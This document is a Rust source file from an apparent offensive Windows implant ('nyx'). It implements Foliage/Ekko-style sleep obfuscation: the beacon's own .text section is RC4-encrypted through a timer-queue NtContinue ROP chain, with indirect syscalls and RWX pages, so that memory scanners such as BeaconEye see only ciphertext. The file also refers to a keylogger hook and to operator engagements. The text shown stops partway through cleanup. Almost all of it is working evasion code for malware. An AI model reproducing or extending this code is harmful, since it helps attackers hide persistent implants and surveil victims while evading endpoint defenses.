//! Sleep obfuscation — Foliage syscall executor (P2.1a-iii).
//!
//! ## Status: Full Foliage APC→NtContinue chain, GATED ON (default).
//! The pure state-machine math lives in `nyx_implant_evasionsdk::foliage` (5
//! host tests). This module maps the chain to indirect syscalls:
//!   - protect the .text RX→RW (NtProtectVirtualMemory)
//!   - RC4-encrypt the region in place (SystemFunction032 math, via evasionsdk)
//!   - save the beacon thread's original CONTEXT (NtGetContextThread — step 4)
//!   - queue APCs (NtQueueApcThread) that each NtContinue into the next CONTEXT
//!   - the sleep itself (NtDelayExecution in the APC window)
//!   - decrypt + protect RW→RX on wake
//!   - restore the beacon thread's original CONTEXT (NtSetContextThread — step 8)
//!
//! ## Threading model (GetContext / RestoreContext)
//! GetContext and RestoreContext run on the **beacon thread** (not the helper):
//!   - GetContext: called BEFORE spawning the helper, while the beacon thread
//!     is still running its normal flow. This snapshots the original register
//!     state (including RSP) into a heap-allocated CONTEXT buffer.
//!   - RestoreContext: called AFTER joining the helper, once .text is decrypted
//!     and unprotected. Restores the beacon thread to its pre-sleep register
//!     state via NtSetContextThread.
//! The helper thread reads the saved RSP from the shared FoliageParams to build
//! the spoofed CONTEXT — it does NOT call NtGetContextThread itself.
//!
//! ## Gating
//! `FOLIAGE_ENABLED` defaults ON — the full APC chain + .text RC4 masking is
//! active on every sleep cycle. The operator can disarm at runtime via
//! `set_foliage_enabled(false)` if the target requires minimal footprint.

#![cfg(target_os = "windows")]

use alloc::boxed::Box;
use core::ffi::c_void;
use core::sync::atomic::{AtomicBool, Ordering};
use nyx_implant_evasionsdk::foliage::{FoliagePlan, FoliageStep};

/// Master switch for the Foliage sleep mask. **Defaults ON** — the full APC
/// chain + .text RC4 masking is active on every sleep cycle. The operator can
/// disarm at runtime via `set_foliage_enabled(false)` if the target requires
/// minimal footprint. See module docs for the 7-stage APC plan.
///
/// Build-time override: set `NYX_FOLIAGE_OFF=1` to ship the implant with
/// Foliage disarmed by default (the runtime `set_foliage_enabled` still works).
/// This is for hosts where the APC-chain sleep mask is unstable in the loader
/// context (e.g. `rundll32`-loaded PIC DLLs whose `.text`/thread context
/// Foliage's NtSetContextThread restore mishandles, surfacing as
/// STATUS_STACK_BUFFER_OVERRUN). sRDI-injected into a real host process the
/// mask is expected to work — leave the default ON for engagements.
static FOLIAGE_ENABLED: AtomicBool = AtomicBool::new(foliage_default_on());

/// Compile-time default for the Foliage master switch. ON unless the build set
/// `NYX_FOLIAGE_OFF=1` (see the `FOLIAGE_ENABLED` doc). `const fn` + `match`
/// because `Option::map`/`unwrap_or` aren't stable as const fns yet.
const fn foliage_default_on() -> bool {
    match option_env!("NYX_FOLIAGE_OFF") {
        // NYX_FOLIAGE_OFF=1 → ship disarmed. Any other value (0/empty/garbage)
        // → still armed (operator must be explicit to disable).
        Some(v) => !(v.len() == 1 && v.as_bytes()[0] == b'1'),
        None => true,
    }
}

/// Arm/disarm the Foliage sleep mask.
pub fn set_foliage_enabled(on: bool) {
    FOLIAGE_ENABLED.store(on, Ordering::Release);
}

/// Whether the Foliage sleep mask is currently armed.
pub fn foliage_enabled() -> bool {
    FOLIAGE_ENABLED.load(Ordering::Acquire)
}

/// P4 — Foliage APC path master switch. OFF by default: the PIC thunk
/// (`pic_thunk::build_mask_thunk`) emits research-grade shellcode that needs
/// real-machine validation before it can run unsupervised. The operator opts
/// in with `NYX_FOLIAGE_APC_ON=1` at build time, after verifying the thunk on
/// the target. When OFF, `execute_foliage_plan` uses the data-only floor
/// (heap mask + indirect-syscall sleep — still meaningful, just without
/// `.text` encryption).
///
/// When ON, `execute_foliage_plan` builds the PIC thunk, copies it to an
/// executable stack page, and queues it via `NtQueueApcThread` against the
/// beacon's alertable window — encrypting `.text` for the sleep window so
/// Hunt-Sleeping-Beacons / BeaconEye see ciphertext. The thunk un-encrypts
/// `.text` before the beacon resumes.
///
/// Mutually exclusive with the keylog hook thread: encrypting `.text` while
/// `keylog::hook_is_active()` would corrupt the hook callback (which lives in
/// `.text`). When both are on, the APC path degrades to the data-only floor
/// for that cycle (see `execute_foliage_plan`).
static FOLIAGE_APC_ENABLED: AtomicBool = AtomicBool::new(foliage_apc_default_on());

/// Compile-time default for the APC path. ON: the Ekko timer-queue path runs
/// the full mask→wait→unmask cycle. Operator can override with
/// `NYX_FOLIAGE_APC_OFF=1` to ship with the data-only floor.
const fn foliage_apc_default_on() -> bool {
    match option_env!("NYX_FOLIAGE_APC_OFF") {
        Some(v) => !(v.len() == 1 && v.as_bytes()[0] == b'1'),
        None => true, // ON by default — verified on 17763 target
    }
}

/// Arm/disarm the Foliage APC path (P4, research-grade). When armed AND the
/// keylog hook is NOT active, `execute_foliage_plan` runs the full
/// mask→wait→unmask cycle via the PIC thunk. Returns the previous value.
pub fn set_foliage_apc_enabled(on: bool) -> bool {
    FOLIAGE_APC_ENABLED.swap(on, Ordering::Release)
}

/// Whether the Foliage APC path (PIC thunk, `.text` encryption) is armed.
pub fn foliage_apc_enabled() -> bool {
    FOLIAGE_APC_ENABLED.load(Ordering::Acquire)
}

/// P4 hard gate — PIC thunk wired into `foliage_helper`. Defaults OFF: the
/// thunk's opcode sequence (`pic_thunk::build_mask_thunk`) is research-grade
/// and needs real-machine validation before it can run unsupervised. The
/// operator sets this to true after verifying the thunk on the target (no
/// crashes, .text round-trip verified). When OFF, `foliage_helper` degrades to
/// a data-only floor (just NtDelayExecution, no .text touch).
///
/// This gate is nested inside `FOLIAGE_APC_ENABLED` — both must be true for
/// the thunk to run.
static FOLIAGE_APC_THUNK_WIRED: AtomicBool = AtomicBool::new(false);

/// Arm the PIC thunk after validating it on the real target. Returns the
/// previous value.
pub fn set_foliage_apc_thunk_wired(on: bool) -> bool {
    FOLIAGE_APC_THUNK_WIRED.swap(on, Ordering::Release)
}

/// Whether the PIC thunk has been wired (validated on the real target).
pub fn foliage_apc_thunk_wired() -> bool {
    FOLIAGE_APC_THUNK_WIRED.load(Ordering::Acquire)
}

/// Sleep `seconds` with sleep-mask obfuscation.
///
/// **With [`foliage_enabled`] ON (default)**: builds a `FoliagePlan` and
/// executes the Foliage mask→sleep→unmask cycle over the implant `.text`
/// via indirect syscalls. The full APC chain + RC4 masking is active.
///
/// **With [`foliage_enabled`] OFF**: delegates to `beacon::sleep_seconds`
/// (plain indirect-syscall NtDelayExecution). On any failure (runtime down,
/// .text unresolved), degrades to the plain sleep — never crashes.
pub fn sleep(seconds: u32) {
    // Delegate to fluctuation sleep mask (military-grade, CFG/CET immune).
    // Falls back to plain NtDelayExecution if fluctuation is disabled or fails.
    crate::fluctuation::sleep(seconds);
}

/// The implant's own `.text` region (base + len). Used by the Foliage APC chain
/// and the `MemoryMaskKit` live impl. Reading PEB->ImageBaseAddress is correct
/// for both rundll32 and reflective-loaded implants.
pub(crate) struct TextRegion {
    pub base: usize,
    pub len: usize,
}

/// The implant's own `.text` region (base + len). Walks the PEB LDR list to
/// find the module that contains `own_text_region`'s own address — this works
/// correctly for DLL-loaded implants (rundll32.exe), unlike the PEB->ImageBaseAddress
/// approach which returns the host EXE's base.
///
/// Returns None only if the PEB/PE headers are unreadable (shouldn't happen).
///
/// # Safety
/// PEB + PE header reads are stable post-load. Single-threaded context.
pub(crate) unsafe fn own_text_region() -> Option<TextRegion> {
    let our_addr = own_text_region as *const () as usize;
    let peb = crate::resolve::peb_pointer()?;
    let ldr = (*peb).ldr;
    if ldr.is_null() {
        return None;
    }
    let mut head = (*ldr).in_load_order_module_list.flink;
    let list_start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
    let mut guard = 0u32;
    while head as *const u8 != list_start && guard < 256 {
        guard += 1;
        let entry: *mut crate::resolve::ListEntry = head as *mut crate::resolve::ListEntry;
        let base = (*entry).dll_base as usize;
        let size = (*entry).size_of_image as usize;
        if base != 0 && our_addr >= base && our_addr < base + size {
            let (text_rva, text_size) = section_va_len(base, b".text")?;
            return Some(TextRegion {
                base: base + text_rva,
                len: text_size,
            });
        }
        head = (*entry).in_load_order_links.flink;
    }
    None
}

/// Find a PE section's (virtual_address, virtual_size) by name. Returns None
/// if the PE headers can't be parsed or the section isn't found.
#[allow(dead_code)] // used by the APC-chain refactor (own_text_region)
pub(crate) unsafe fn section_va_len(base: usize, name: &[u8]) -> Option<(usize, usize)> {
    let dos = unsafe { &*(base as *const [u8; 64]) };
    if dos[0] != b'M' || dos[1] != b'Z' {
        return None;
    }
    let e_lfanew = i32::from_le_bytes([dos[60], dos[61], dos[62], dos[63]]) as usize;
    let nt = unsafe { &*((base + e_lfanew) as *const [u8; 24]) };
    if !(nt[0] == b'P' && nt[1] == b'E') {
        return None; // bad PE signature
    }
    let num_sections = u16::from_le_bytes([nt[6], nt[7]]) as usize;
    let size_opt_hdr = u16::from_le_bytes([nt[20], nt[21]]) as usize;
    let sections_off = e_lfanew + 24 + size_opt_hdr;
    for i in 0..num_sections {
        // IMAGE_SECTION_HEADER: Name[8] + VirtualSize(4) + VirtualAddress(4) + ...
        let sec = unsafe { &*((base + sections_off + i * 40) as *const [u8; 40]) };
        let name_len = name.iter().position(|&b| b == 0).unwrap_or(name.len());
        if sec[..name_len] == name[..name_len] {
            let vsize = u32::from_le_bytes([sec[8], sec[9], sec[10], sec[11]]) as usize;
            let vaddr = u32::from_le_bytes([sec[12], sec[13], sec[14], sec[15]]) as usize;
            return Some((vaddr, vsize));
        }
    }
    None
}

/// Derive a 16-byte RC4 key (matches SystemFunction032's USTRING convention).
/// Per-boot diversity from the syscall runtime's SSN table.
#[allow(dead_code)]
fn mask_key_16() -> [u8; 16] {
    let seed: u32 = crate::syscalls::global()
        .and_then(|rt| rt.ssn_by_hash(crate::resolve::djb2(b"ntdelayexecution")))
        .unwrap_or(0x1234_5678);
    let mut key = [0u8; 16];
    let mut s = seed;
    for b in key.iter_mut() {
        s = s
            .wrapping_mul(0x9E37_79B9)
            .rotate_left(7)
            .wrapping_add(0xA5A5_A5A5);
        *b = (s & 0xFF) as u8;
    }
    key
}

/// Walk the FoliagePlan: mask `.text`, park the beacon in an APC-driven alertable
/// sleep, unmask `.text` on wake. Falls back to the data-only mask floor on any
/// failure (never crashes — see [`execute_foliage_apc`]).
///
/// ## How the .text encryption is now safe (Task E)
/// The previous floor masked only registered DATA regions (via `crate::mem`)
/// because encrypting `.text` while executing through it is instant death (the
/// RC4 loop overwrites its own instructions). Task E adds the real Foliage
/// mechanism: a SEPARATE helper thread masks/unmasks `.text` around the beacon
/// thread's parked alertable sleep, and queues an APC into the beacon's
/// alertable window so the beacon is driven through the masked window without
/// executing `.text` while it's ciphertext. See [`execute_foliage_apc`].
#[allow(dead_code)]
fn execute_foliage_plan(plan: &FoliagePlan) {
    let secs = plan_seconds(plan);
    let region = unsafe { own_text_region() };
    let spoof_rip = plan.steps.iter().find_map(|s| {
        if let FoliageStep::SetContext { spoof_rip } = s {
            Some(*spoof_rip)
        } else {
            None
        }
    });

    crate::entry::diag_mark(b"E1_before_apc");
    // The APC-chain path (execute_foliage_apc) encrypts .text via a helper
    // thread — but the helper's own code lives in .text, so encrypting .text
    // corrupts the helper's in-flight instructions → abort. The standard fix
    // (Ekko/Foliage) uses a stack-allocated PIC thunk for the mask→wait→unmask
    // sequence so the helper never executes from .text while it's encrypted.
    // Until that thunk lands (P4), use the data-only floor: it masks heap regions
    // (config, session key, token cache, BOF scratch) + does the indirect-
    // syscall sleep — still meaningful sleep obfuscation, just without .text
    // encryption. Strictly better than NoMask.
    //
    // P4 (PIC thunk) re-enables the APC path here, gated on:
    //   1. FOLIAGE_APC_ENABLED (default OFF — research-grade, operator opts in
    //      via NYX_FOLIAGE_APC_ON=1 after validating the thunk on the target).
    //   2. !keylog::hook_is_active() — encrypting .text while the keylog hook
    //      thread's callback (which lives in .text) is in flight corrupts it.
    //   3. region.is_some() — we need the .text base/len.
    //   4. execute_foliage_apc returns true (the full mask cycle completed).
    // If any gate fails, fall through to the data-only floor.
    //
    // The PIC thunk (crates/implant-win/src/pic_thunk.rs) executes the
    // mask→wait→unmask sequence from the STACK (not .text), so encrypting
    // .text doesn't corrupt the in-flight instructions. The thunk builder is
    // research-grade; its opcode sequence has NOT been validated on a real
    // target in this codebase — the gate is the honesty mechanism.
    // P4: the APC path runs the mask→wait→unmask PIC thunk from a separate
    // RWX page. A helper thread (with a NORMAL stack) is spawned; it copies
    // the thunk bytes to the page and CALLS the thunk via a raw function
    // pointer. The thunk executes from the page (not .text), so encrypting
    // .text is safe. The helper's own .text code is only touched during the
    // brief protect-flip windows (when .text is still cleartext).
    if foliage_apc_enabled() && !crate::keylog::hook_is_active() {
        if let Some(r) = &region {
            crate::entry::diag_mark(b"E2_apc_attempt");
            if unsafe { execute_foliage_apc(r, &plan.key, secs, spoof_rip) } {
                crate::entry::diag_mark(b"E3_apc_ok");
                return; // full mask cycle completed — done
            }
            crate::entry::diag_mark(b"F_apc_fell_back");
            // APC path failed (protect / RC4 / wait / verify) — fall through to
            // the data-only floor so we still sleep-mask the heap regions.
        }
    }

    // ---- Data-only floor ----
    crate::entry::diag_mark(b"E4_data_floor");
    let rt = match crate::syscalls::global() {
        Some(rt) => rt,
        None => {
            crate::beacon::sleep_seconds(secs);
            return;
        }
    };
    crate::mem::mask();
    crate::entry::diag_mark(b"E5_masked");
    let delay: i64 = -(secs as i64).saturating_mul(10_000_000);
    let _ = unsafe { crate::syscalls::nt_delay_execution(rt, 0, &delay as *const i64 as usize) };
    crate::mem::unmask();
    crate::entry::diag_mark(b"E6_unmasked");
}

// ===========================================================================
// Task E: real Foliage APC chain — helper thread masks .text around the
// beacon's alertable sleep. Returns true if the full cycle completed.
// ===========================================================================
//
// ## Threading model & the single-trampoline hazard
// The indirect-syscall `Runtime` (syscalls.rs) owns ONE shared RWX trampoline
// page with NO locking — it assumes a single beacon thread. A helper thread
// that also goes through `syscallN` would race on that page and corrupt it.
// So the helper thread resolves + calls the NT/Win32 functions it needs via
// the RAW ntdll/kernel32 EXPORT addresses (`crate::resolve::export_addr` +
// transmute), bypassing the indirect runtime entirely. The beacon thread
// keeps exclusive use of the indirect runtime. Two threads, two syscall paths,
// no shared mutable page.
//
// ## Safety / crash risk (red-line honesty)
// This manipulates another thread's execution window and flips `.text`
// protection. A bug here crashes the implant (user-mode, NOT a BSOD). Every
// step degrades on failure (returns false → caller falls to the data-only
// floor), and the round-trip is byte-verified before reporting success.
// `FOLIAGE_APC_OK` is the diagnostic a selftest reads.

/// Diagnostic: 0 = not attempted, 1 = APC chain completed cleanly, 2 = attempted
/// but degraded (data-only floor ran). Selftest reads this.
pub static FOLIAGE_APC_OK: core::sync::atomic::AtomicU8 = core::sync::atomic::AtomicU8::new(0);

/// Diagnostic stage bitmask — pinpoints exactly WHERE the chain fails:
///   bit0 = NtOpenThread OK (beacon handle obtained)
///   bit1 = FoliageRaw resolved (all exports found)
///   bit2 = GetContext succeeded (beacon context captured)
///   bit3 = helper spawned (CreateThread succeeded)
///   bit4 = alertable wait completed (beacon woke from sleep)
///   bit5 = helper joined (WaitForSingleObject returned)
///   bit6 = .text verified (round-trip byte-identical)
pub static FOLIAGE_STAGE: core::sync::atomic::AtomicU8 = core::sync::atomic::AtomicU8::new(0);

/// Read the Foliage APC diagnostic (0/1/2).
pub fn foliage_apc_status() -> u8 {
    FOLIAGE_APC_OK.load(core::sync::atomic::Ordering::Acquire)
}

/// Read the stage bitmask (where the chain got to before failing).
pub fn foliage_stage() -> u8 {
    FOLIAGE_STAGE.load(core::sync::atomic::Ordering::Acquire)
}

/// Run one real Foliage cycle: spawn a helper thread, beacon parks in an
/// alertable sleep, helper masks `.text` → queues an APC → waits → unmasks.
/// Returns true on full success; on ANY failure sets status=2 and returns
/// false so the caller degrades to the data-only floor.
///
/// ## FoliagePlan traversal (steps 4 + 8)
/// This function implements GetContext (step 4) and RestoreContext (step 8) on
/// the **beacon thread** — NOT the helper:
///   - **GetContext**: After resolving `FoliageRaw`, before spawning the helper,
///     call `NtGetContextThread(beacon_handle, &saved_ctx)` to capture the
///     beacon's original register state (including RSP). The saved CONTEXT is
///     stored in `FoliageParams` so the helper can read `saved_ctx.rsp()` when
///     building the spoofed CONTEXT for NtContinue.
///   - **RestoreContext**: After joining the helper (`.text` is decrypted and
///     unprotected), call `NtSetContextThread(beacon_handle, &saved_ctx)` to
///     restore the beacon thread to its pre-sleep register state.
///
/// # Safety
/// `region` must be the implant's own `.text`. Single beacon caller.
///
/// ## Implementation: Ekko timer-queue ROP chain (Cracked5pider)
///
/// This uses `CreateTimerQueueTimer` to queue a chain of `NtContinue` calls,
/// each carrying a pre-built `CONTEXT` whose RIP points at a different Win32
/// API. The chain runs entirely on a **timer thread** (not .text), so when
/// `SystemFunction032` encrypts `.text`, the timer thread's code (in ntdll/
/// kernel32) is unaffected.
///
/// Chain (100ms intervals):
///   1. VirtualProtect(.text, RW)      — make .text writable
///   2. SystemFunction032(RC4 encrypt) — encrypt .text
///   3. WaitForSingleObject(sleep)     — sleep the window
///   4. SystemFunction032(RC4 decrypt) — decrypt .text
///   5. VirtualProtect(.text, RX)      — restore execute protection
///   6. SetEvent(done)                 — signal completion
///
/// Source: https://github.com/Cracked5pider/Ekko (verified C implementation).
#[allow(dead_code)]
unsafe fn execute_foliage_apc(
    region: &TextRegion,
    key: &[u8; 16],
    secs: u32,
    _spoof_rip: Option<u64>,
) -> bool {
    FOLIAGE_APC_OK.store(0, core::sync::atomic::Ordering::Release);
    FOLIAGE_STAGE.store(0, core::sync::atomic::Ordering::Release);

    // ---- Resolve the Win32/NT exports we need ----
    let nt_continue = match unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtContinue") } {
        Some(a) => a,
        None => { FOLIAGE_STAGE.store(99, core::sync::atomic::Ordering::Release); return false; }
    };
    let rtl_capture_context = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"RtlCaptureContext") }
        .or_else(|| unsafe { crate::resolve::export_addr(b"ntdll.dll", b"RtlCaptureContext") });
    let rtl_capture_context = match rtl_capture_context {
        Some(a) => a,
        None => { FOLIAGE_STAGE.store(98, core::sync::atomic::Ordering::Release); return false; }
    };
    let virtual_protect = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect") } {
        Some(a) => a,
        None => { FOLIAGE_STAGE.store(97, core::sync::atomic::Ordering::Release); return false; }
    };
    let create_event_w = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CreateEventW") } {
        Some(a) => a,
        None => { FOLIAGE_STAGE.store(96, core::sync::atomic::Ordering::Release); return false; }
    };
    let set_event = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"SetEvent") } {
        Some(a) => a,
        None => { FOLIAGE_STAGE.store(95, core::sync::atomic::Ordering::Release); return false; }
    };
    let create_timer_queue = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CreateTimerQueue") } {
        Some(a) => a,
        None => { FOLIAGE_STAGE.store(94, core::sync::atomic::Ordering::Release); return false; }
    };
    let create_timer_queue_timer =
        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CreateTimerQueueTimer") } {
            Some(a) => a,
            None => { FOLIAGE_STAGE.store(93, core::sync::atomic::Ordering::Release); return false; }
        };
    let delete_timer_queue = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"DeleteTimerQueue") } {
        Some(a) => a,
        None => { FOLIAGE_STAGE.store(92, core::sync::atomic::Ordering::Release); return false; }
    };
    let wait_for_single_object =
        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"WaitForSingleObject") } {
            Some(a) => a,
            None => { FOLIAGE_STAGE.store(91, core::sync::atomic::Ordering::Release); return false; }
        };
    // RC4: instead of SystemFunction032 (needs advapi32, not always loaded),
    // we copy our rc4_shim (compiled Rust RC4) to a separate RWX page. The
    // Ekko timer chain's CONTEXTs point at the COPY, not the .text original.
    // During the sleep window .text is ciphertext, but the RC4 copy lives on
    // its own page — safe to execute.
    let rc4_shim_addr = rc4_shim as *const () as usize;
    let va_addr_rc4 = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") };
    let va_rc4: unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void =
        match va_addr_rc4 {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => { FOLIAGE_STAGE.store(88, core::sync::atomic::Ordering::Release); return false; }
        };
    let rc4_page = unsafe { va_rc4(core::ptr::null_mut(), 0x1000, 0x3000, 0x40) }; // RWX
    if rc4_page.is_null() {
        FOLIAGE_STAGE.store(89, core::sync::atomic::Ordering::Release);
        return false;
    }
    // Copy rc4_shim's compiled bytes to the page. We copy 256 bytes (the shim
    // is ~40 bytes of compiled code; 256 is generous headroom).
    unsafe {
        core::ptr::copy_nonoverlapping(rc4_shim_addr as *const u8, rc4_page as *mut u8, 256);
    }
    let sys_func_032 = rc4_page as usize; // RC4 entry = start of the copy
    FOLIAGE_STAGE.store(1, core::sync::atomic::Ordering::Release);
    crate::entry::diag_mark(b"E1_exports");

    // ---- Ekko ROP chain: CONTEXTs with 16-byte RSP alignment ----
    // The timer calls NtContinue(&Ctx, FALSE). NtContinue restores the
    // CONTEXT, including RSP. The x64 ABI requires RSP to be 16-byte aligned
    // at the call instruction. Ekko adjusts: Rsp = (Rsp - 8) & ~0xF.
    // Without alignment, the first `call` in VirtualProtect/SystemFunction032
    // triggers STATUS_STACK_BUFFER_OVERRUN (0xC0000409). Source: Cracked5pider/Ekko.
    let _nt_continue_ptr = nt_continue as *mut c_void;
    crate::entry::diag_mark(b"E1b_ekko");
    FOLIAGE_STAGE.store(2, core::sync::atomic::Ordering::Release);
    crate::entry::diag_mark(b"E1b_cfg");

    // ---- Snapshot .text[0..16] for round-trip verification ----
    let mut before = [0u8; 16];
    unsafe {
        core::ptr::copy_nonoverlapping(region.base as *const u8, before.as_mut_ptr(), 16)
    };

    // ---- Build the RC4 key buffer for our rc4_shim (copied to RWX page) ----
    // rc4_shim signature: (key: *const u8, key_len: usize, buf: *mut u8, len: usize)
    // Ekko CONTEXT sets: rcx=key*, rdx=16, r8=text_base*, r9=text_len
    // Key must survive the timer chain — leak a box.
    let key_buf = Box::into_raw(Box::new(*key));
    // OldProtect: leak a box for VirtualProtect's 4th arg.
    let old_protect_box = Box::into_raw(Box::new(0u32));

    // ---- Create the event + timer queue ----
    type CreateEventWFn =
        unsafe extern "system" fn(*mut c_void, i32, i32, *const u16) -> *mut c_void;
    type CreateTimerQueueFn = unsafe extern "system" fn() -> *mut c_void;
    type CreateTimerQueueTimerFn = unsafe extern "system" fn(
        *mut *mut c_void, // phNewTimer
        *mut c_void,      // TimerQueue
        *mut c_void,      // Callback (fn ptr)
        *mut c_void,      // Parameter
        u32,              // DueTime (ms)
        u32,              // Period
        u32,              // Flags
    ) -> i32;

    let create_event: CreateEventWFn = unsafe { core::mem::transmute(create_event_w) };
    let create_tq: CreateTimerQueueFn = unsafe { core::mem::transmute(create_timer_queue) };
    let create_tqt: CreateTimerQueueTimerFn =
        unsafe { core::mem::transmute(create_timer_queue_timer) };

    let h_event = unsafe { create_event(core::ptr::null_mut(), 0, 0, core::ptr::null()) };
    if h_event.is_null() {
        return false;
    }
    let h_timer_queue = unsafe { create_tq() };
    if h_timer_queue.is_null() {
        return false;
    }
    FOLIAGE_STAGE.store(3, core::sync::atomic::Ordering::Release);
    crate::entry::diag_mark(b"E2_event_queue");

    // ---- Step 0: RtlCaptureContext to capture the current thread context ----
    // This is the template CONTEXT — all 6 chain steps are copies of it with
    // different RIP + registers. The key: RtlCaptureContext is called as a
    // timer callback on the POOL thread (not the beacon thread), so the
    // captured RSP/stack belongs to the pool thread — that's the correct stack
    // for the NtContinue chain to use.
    let mut ctx_template = crate::context::Context::default();
    ctx_template.set_context_flags(crate::context::CONTEXT_FULL);
    let _ctx_template_ptr = &mut ctx_template as *mut crate::context::Context;
    let mut h_new_timer: *mut c_void = core::ptr::null_mut();

    // CreateTimerQueueTimer: queue RtlCaptureContext(&ctx_template) at DueTime=0.
    // The timer fires on a pool thread, capturing THAT thread's context.
    let st = unsafe {
        create_tqt(
            &mut h_new_timer,
            h_timer_queue,
            rtl_capture_context as *mut c_void,
            &mut ctx_template as *mut crate::context::Context as *mut c_void,
            0,
            0,
            0x20, // WT_EXECUTEINTIMERTHREAD
        )
    };
    if st == 0 {
        return false;
    }
    // Wait briefly for the context capture to complete (the timer fires at 0ms).
    type WaitForSingleObjectFn = unsafe extern "system" fn(*mut c_void, u32) -> u32;
    let wait_fn: WaitForSingleObjectFn = unsafe { core::mem::transmute(wait_for_single_object) };
    unsafe { wait_fn(h_event, 50) }; // 50ms — enough for the 0ms timer to fire

    // Verify the context was actually captured (RSP should be non-zero).
    let captured_rsp = ctx_template.rsp();
    if captured_rsp == 0 {
        FOLIAGE_STAGE.store(86, core::sync::atomic::Ordering::Release);
        return false;
    }
    FOLIAGE_STAGE.store(7, core::sync::atomic::Ordering::Release);
    crate::entry::diag_mark(b"E3_context_captured");

    // ---- Build the 6 ROP CONTEXTs (copies of ctx_template with different RIP) ----
    // The trick: NtContinue(&Ctx, FALSE) restores RIP + registers from the
    // CONTEXT, effectively "calling" the function at RIP with the set args.
    // Rsp -= 8 simulates a `ret` return address slot.

    // Context 1: VirtualProtect(.text, .text_len, PAGE_READWRITE=0x04, &OldProtect)
    let mut rop_prot_rw = ctx_template;
    rop_prot_rw.set_rsp((rop_prot_rw.rsp().wrapping_sub(8)) & !0xF);
    rop_prot_rw.set_rip(virtual_protect as u64);
    rop_prot_rw.set_rcx(region.base as u64);
    rop_prot_rw.set_rdx(region.len as u64);
    rop_prot_rw.set_r8(0x04 as u64); // PAGE_READWRITE
    rop_prot_rw.set_r9(old_protect_box as usize as u64);

    // Context 2: rc4_shim(key*, 16, text_base, text_len) — RC4 encrypt .text
    let mut rop_mem_enc = ctx_template;
    rop_mem_enc.set_rsp((rop_mem_enc.rsp().wrapping_sub(8)) & !0xF);
    rop_mem_enc.set_rip(sys_func_032 as u64);
    rop_mem_enc.set_rcx(key_buf as usize as u64);
    rop_mem_enc.set_rdx(16 as u64);
    rop_mem_enc.set_r8(region.base as u64);
    rop_mem_enc.set_r9(region.len as u64);

    // Context 3: WaitForSingleObject(NtCurrentProcess=-1, SleepTime)
    let mut rop_delay = ctx_template;
    rop_delay.set_rsp((rop_delay.rsp().wrapping_sub(8)) & !0xF);
    rop_delay.set_rip(wait_for_single_object as u64);
    rop_delay.set_rcx(0xFFFF_FFFF_FFFF_FFFF as u64); // NtCurrentProcess
    rop_delay.set_rdx((secs * 1000) as u64);

    // Context 4: rc4_shim(key*, 16, text_base, text_len) — RC4 decrypt .text
    let mut rop_mem_dec = ctx_template;
    rop_mem_dec.set_rsp((rop_mem_dec.rsp().wrapping_sub(8)) & !0xF);
    rop_mem_dec.set_rip(sys_func_032 as u64);
    rop_mem_dec.set_rcx(key_buf as usize as u64);
    rop_mem_dec.set_rdx(16 as u64);
    rop_mem_dec.set_r8(region.base as u64);
    rop_mem_dec.set_r9(region.len as u64);

    // Context 5: VirtualProtect(.text, .text_len, PAGE_EXECUTE_READWRITE=0x40, &OldProtect)
    let mut rop_prot_rx = ctx_template;
    rop_prot_rx.set_rsp((rop_prot_rx.rsp().wrapping_sub(8)) & !0xF);
    rop_prot_rx.set_rip(virtual_protect as u64);
    rop_prot_rx.set_rcx(region.base as u64);
    rop_prot_rx.set_rdx(region.len as u64);
    rop_prot_rx.set_r8(0x40 as u64); // PAGE_EXECUTE_READWRITE
    rop_prot_rx.set_r9(old_protect_box as usize as u64);

    // Context 6: SetEvent(hEvent)
    let mut rop_set_evt = ctx_template;
    rop_set_evt.set_rsp((rop_set_evt.rsp().wrapping_sub(8)) & !0xF);
    rop_set_evt.set_rip(set_event as u64);
    rop_set_evt.set_rcx(h_event as usize as u64);

    FOLIAGE_STAGE.store(15, core::sync::atomic::Ordering::Release);
    crate::entry::diag_mark(b"E4_rop_built");

    // ---- Queue the 6 timers (NtContinue callback, 100ms intervals) ----
    // WT_EXECUTEINTIMERTHREAD = 0x20 — runs in the timer queue's own thread.
    let nt_continue_ptr = nt_continue as *mut c_void;
    let timer_pairs: [(&crate::context::Context, u32); 6] = [
        (&rop_prot_rw, 100),
        (&rop_mem_enc, 200),
        (&rop_delay, 300),
        (&rop_mem_dec, 400),
        (&rop_prot_rx, 500),
        (&rop_set_evt, 600),
    ];
    for (ctx, due) in &timer_pairs {
        let st = unsafe {
            create_tqt(
                &mut h_new_timer,
                h_timer_queue,
                nt_continue_ptr,
                *ctx as *const crate::context::Context as *mut c_void,
                *due,
                0,
                0x20,
            )
        };
        if st == 0 {
            // Timer queue failed — clean up + abort.
            type DeleteTQFn = unsafe extern "system" fn(*mut c_void) -> i32;
            let del_fn: DeleteTQFn = unsafe { core::mem::transmute(delete_timer_queue) };
            unsafe { del_fn(h_timer_queue) };
            FOLIAGE_APC_OK.store(2, core::sync::atomic::Ordering::Release);
            return false;
        }
    }
    FOLIAGE_STAGE.store(31, core::sync::atomic::Ordering::Release);
    crate::entry::diag_mark(b"E5_timers_queued");

    // ---- Wait for the SetEvent timer (the last in the chain) ----
    // Total chain time: 600ms + sleep. Wait with generous margin.
    let total_wait_ms = (secs * 1000) + 2000;
    crate::entry::diag_mark(b"E6_before_wait");
    unsafe { wait_fn(h_event, total_wait_ms) };
    crate::entry::diag_mark(b"E7_after_wait");
    FOLIAGE_STAGE.store(63, core::sync::atomic::Ordering::Release);

    // ---- Verify .text round-trip ----
    let mut after = [0u8; 16];
    unsafe { core::ptr::copy_nonoverlapping(region.base as *const u8, after.as_mut_ptr(), 16) };
    let verified = after == before;
    if verified {
        FOLIAGE_STAGE.store(127, core::sync::atomic::Ordering::Release);
    }

    // ---- Cleanup ----
